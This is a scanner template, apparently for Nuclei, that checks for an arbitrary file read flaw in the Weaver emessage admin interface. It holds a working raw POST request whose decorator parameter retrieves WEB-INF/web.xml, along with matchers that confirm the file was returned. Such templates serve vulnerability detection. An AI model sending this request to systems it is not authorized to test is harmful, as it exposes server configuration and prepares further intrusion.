id: emessage-readfile
info:
  name: emessage-readfile
  author: apple
  severity: medium
  description: 泛微 emessage 管理界面存在任意文件读取漏洞隐患，攻击者可通过此漏洞获取敏感信息，为下一步攻击做准备。
  reference:
    - https://mp.weixin.qq.com/s/BPPQKIm-onrIA4HOwjVtHQ
  tags: weaver
http:
  - raw:
      - |-
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=node03rmjswir0alnezvxvmi7jx8u1497.node0; csrf=P4jVgrrfqikGQQe
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 43

        decorator=%2FWEB-INF%2Fweb.xml&confirm=true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: word
        part: body
        words:
          - <?xml version=
